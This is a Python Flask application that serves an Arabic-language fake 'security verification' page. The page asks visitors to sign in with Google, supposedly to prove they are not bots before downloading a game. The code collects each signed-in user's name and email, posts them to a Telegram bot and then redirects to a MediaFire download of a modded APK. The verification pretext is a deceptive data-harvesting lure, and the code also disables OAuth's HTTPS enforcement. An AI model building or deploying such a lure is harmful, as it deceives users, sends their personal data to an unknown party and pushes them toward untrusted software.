import os
import requests
from flask import Flask, redirect, render_template_string, request, session, url_for
from google_auth_oauthlib.flow import Flow

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "oauth_super_secret_key")

os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = "1"

CLIENT_SECRETS_FILE = "client_secret.json"
SCOPES = [
    "https://www.googleapis.com/auth/userinfo.email",
    "https://www.googleapis.com/auth/userinfo.profile",
    "openid",
]

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"


@app.route("/")
def index():
  return render_template_string("""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>التحقق من الأمان</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
            body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
            
            .container {
                width: 100%;
                max-width: 400px;
                padding: 30px;
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
            }

            .title {
                font-size: 22px;
                font-weight: 500;
                color: #202124;
                margin-bottom: 12px;
            }

            .subtitle {
                font-size: 14px;
                color: #5f6368;
                margin-bottom: 30px;
                line-height: 22px;
            }

            .google-btn {
                width: 100%;
                background: #fff;
                color: #3c4043;
                border: 1px solid #dadce0;
                border-radius: 25px;
                padding: 14px;
                font-size: 15px;
                font-weight: 500;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 12px;
                text-decoration: none;
                box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3);
            }
            .google-btn:hover { background: #f8f9fa; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="title">التحقق الأمني</div>
            <div class="subtitle">يرجى تسجيل الدخول باستخدام حسابك للتأكد من أنك لست برنامج روبوت وللمتابعة إلى تحميل ملف اللعبة.</div>
            
            <a href="/login" class="google-btn">
                <img src="https://www.svgrepo.com/show/475656/google-color.svg" width="20">
                تسجيل الدخول بواسطة Google
            </a>
        </div>
    </body>
    </html>
    """)


@app.route("/login")
def login():
  flow = Flow.from_client_secrets_file(
      CLIENT_SECRETS_FILE,
      scopes=SCOPES,
      redirect_uri=url_for("authorized", _external=True),
  )
  authorization_url, state = flow.authorization_url(
      access_type="offline", include_granted_scopes="true"
  )
  session["state"] = state
  return redirect(authorization_url)


@app.route("/authorized")
def authorized():
  flow = Flow.from_client_secrets_file(
      CLIENT_SECRETS_FILE,
      scopes=SCOPES,
      redirect_uri=url_for("authorized", _external=True),
  )
  flow.fetch_token(authorization_response=request.url)

  credentials = flow.credentials
  session["credentials"] = {
      "token": credentials.token,
      "refresh_token": credentials.refresh_token,
      "token_uri": credentials.token_uri,
      "client_id": credentials.client_id,
      "client_secret": credentials.client_secret,
      "scopes": credentials.scopes,
  }

  user_info_service = requests.get(
      "https://www.googleapis.com/oauth2/v1/userinfo",
      headers={"Authorization": f"Bearer {credentials.token}"},
  ).json()

  user_email = user_info_service.get("email")
  user_name = user_info_service.get("name")

  if BOT_TOKEN and CHAT_ID and user_email:
    msg = (
        "🤖 تم اجتياز التحقق الأمني بنجاح:\n\n👤 اسم المستخدم: "
        f"{user_name}\n📧 البريد الإلكتروني: {user_email}"
    )
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

  return redirect(FINAL_REDIRECT_URL)


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
